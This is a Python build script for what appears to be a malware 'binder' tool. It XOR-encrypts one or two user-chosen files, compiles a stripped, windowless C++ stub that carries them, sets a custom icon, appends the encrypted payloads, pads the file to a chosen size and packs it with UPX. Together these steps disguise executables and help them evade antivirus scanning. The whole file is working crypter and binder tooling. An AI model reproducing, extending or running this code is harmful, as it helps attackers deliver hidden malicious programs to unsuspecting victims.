import os
import sys
import subprocess
import random
import string
from cpp_generator import generate_cpp_code

try:
    from playsound import playsound
except ImportError:
    def playsound(sound, block=True):
        # This is a dummy function if playsound is not installed
        print(f"INFO: playsound library not found. Cannot play {sound}")

def get_resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def _xor_crypt(data, key):
    """Encrypts/decrypts data using XOR cipher."""
    key_len = len(key)
    key_bytes = key.encode('utf-8')
    return bytes([data[i] ^ key_bytes[i % key_len] for i in range(len(data))])

def _run_command(command, log_callback):
    """Runs an external command and logs its output."""
    log_callback('log_command', cmd=' '.join(command))
    process = subprocess.run(
        command, 
        capture_output=True, 
        text=True, 
        encoding='oem', 
        errors='ignore', 
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    if process.returncode != 0:
        log_callback('log_error_command', error=(process.stderr or process.stdout))
    return process

def _play_sound(sound_file, log_callback):
    """Plays a sound file."""
    sound_path = get_resource_path(sound_file)
    if not os.path.exists(sound_path):
        log_callback("log_sound_not_found", sound=sound_path)
        return
    try:
        playsound(sound_path, block=False)
    except Exception as e:
        log_callback("log_sound_error", sound=sound_path, e=e)

def process_build(options, log_callback):
    """
    Main build process function.
    Takes a dictionary of options from the UI and a callback for logging.
    """
    log_callback("log_stage1")
    
    # --- Validation ---
    if not all([options['file1_path'], options['output_path']]):
        log_callback("log_error_mandatory_fields")
        _play_sound("sounds/fail.mp3", log_callback)
        return

    compiler_path = get_resource_path(os.path.join("bin", "g++.exe"))
    if not os.path.exists(compiler_path):
        log_callback("log_error_compiler_not_found", path=compiler_path)
        _play_sound("sounds/fail.mp3", log_callback)
        return

    temp_files = []
    try:
        # --- STAGE 2: DATA PREPARATION ---
        log_callback("log_stage2")
        xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        with open(options['file1_path'], 'rb') as f:
            data1 = f.read()
        encrypted_data1 = _xor_crypt(data1, xor_key)
        file1_size = len(encrypted_data1)
        
        encrypted_data2, file2_size = b'', 0
        if options['file2_path'] and os.path.exists(options['file2_path']):
            with open(options['file2_path'], 'rb') as f:  
                data2 = f.read()
            encrypted_data2 = _xor_crypt(data2, xor_key)
            file2_size = len(encrypted_data2)
        log_callback("log_data_encrypted")

        # --- STAGE 3: COMPILATION ---
        log_callback("log_stage3")
        
        # Prepare options for C++ generator
        cpp_options = options.copy()
        cpp_options.update({
            'xor_key': xor_key,
            'file1_size': file1_size,
            'file2_size': file2_size,
            'file1_filename': os.path.basename(options['file1_path']),
            'file2_filename': os.path.basename(options['file2_path']) if options['file2_path'] else ""
        })
        
        # First, compile with 0 offsets to get the exact size of the stub.
        temp_stub_path = options['output_path'] + ".stub.tmp"
        temp_files.append(temp_stub_path)
        
        cpp_options_pre = cpp_options.copy()
        cpp_options_pre.update({'file1_offset': 0, 'file2_offset': 0})
        cpp_code_pre = generate_cpp_code(**cpp_options_pre)
        
        temp_cpp_file = "temp_binder.cpp"
        temp_files.append(temp_cpp_file)
        with open(temp_cpp_file, 'w', encoding='utf-8') as f: f.write(cpp_code_pre)

        command_pre = [compiler_path, temp_cpp_file, '-o', temp_stub_path, '-s', '-static', '-mwindows']
        if _run_command(command_pre, log_callback).returncode != 0:
            raise Exception("Initial stub compilation failed.")

        # Now we have the exact size, so we can calculate the final offsets.
        stub_size = os.path.getsize(temp_stub_path)
        file1_offset = stub_size
        file2_offset = file1_offset + file1_size

        # Generate the C++ code again with the REAL offsets.
        cpp_options_final = cpp_options.copy()
        cpp_options_final.update({'file1_offset': file1_offset, 'file2_offset': file2_offset})
        cpp_code_final = generate_cpp_code(**cpp_options_final)
        with open(temp_cpp_file, 'w', encoding='utf-8') as f: f.write(cpp_code_final)
        log_callback("log_cpp_generated")

        # Recompile to the final destination.
        command_final = [compiler_path, temp_cpp_file, '-o', options['output_path'], '-s', '-static', '-mwindows']
        if _run_command(command_final, log_callback).returncode != 0:
            raise Exception("Final compilation with offsets failed.")
        log_callback("log_main_compile_ok")

        # --- STAGE 4: MODIFYING RESOURCES ---
        log_callback("log_stage4")
        if options['icon_path'] and os.path.exists(options['icon_path']):
            rcedit_path = get_resource_path(os.path.join("bin", "rcedit-x64.exe"))
            if os.path.exists(rcedit_path):
                cmd = [rcedit_path, "--set-icon", options['icon_path'], options['output_path']]
                if _run_command(cmd, log_callback).returncode == 0:
                    log_callback("log_set_icon_ok")
            else:
                log_callback("log_error_rcedit_not_found", path=rcedit_path)

        # --- STAGE 5: APPENDING PAYLOADS ---
        log_callback("log_stage5")
        with open(options['output_path'], 'ab') as f_out:
            f_out.write(encrypted_data1)
            if encrypted_data2:
                f_out.write(encrypted_data2)
        log_callback("log_append_ok")
        
        # --- STAGE 6: PUMPING FILE ---
        if options['pump_file']:
            log_callback("log_stage6")
            try:
                target_size = options['pump_size'] * 1024 * 1024
                current_size = os.path.getsize(options['output_path'])
                if target_size > current_size:
                    with open(options['output_path'], 'ab') as f: f.write(b'\0' * (target_size - current_size))
                    log_callback("log_pump_success", size=options['pump_size'])
                else: log_callback("log_pump_warn_size")
            except Exception as e: log_callback("log_pump_error", e=e)

        # --- STAGE 7: PACKING WITH UPX ---
        if options['upx_pack']:
            log_callback("log_stage7")
            upx_path = get_resource_path("bin/upx.exe")
            if os.path.exists(upx_path):
                upx_level = f"-{options['upx_level']}"
                command = [upx_path, upx_level, '--force', options['output_path']]
                if _run_command(command, log_callback).returncode == 0:
                    log_callback("log_upx_pack_ok")
                else:
                    log_callback("log_upx_error")
            else:
                log_callback("log_error_upx_not_found", path=upx_path)

        log_callback("log_final_success", path=os.path.abspath(options['output_path']))
        _play_sound("sounds/tada.mp3", log_callback)
        
    except Exception as e:
        log_callback("log_critical_error", e=e)
        _play_sound("sounds/fail.mp3", log_callback)
        
    finally:
        # --- STAGE 8: CLEANUP ---
        log_callback("log_stage8")
        for f in temp_files:
            if os.path.exists(f):
                try: 
                    os.remove(f)
                    log_callback("log_file_deleted", file=f)
                except OSError: 
                    pass
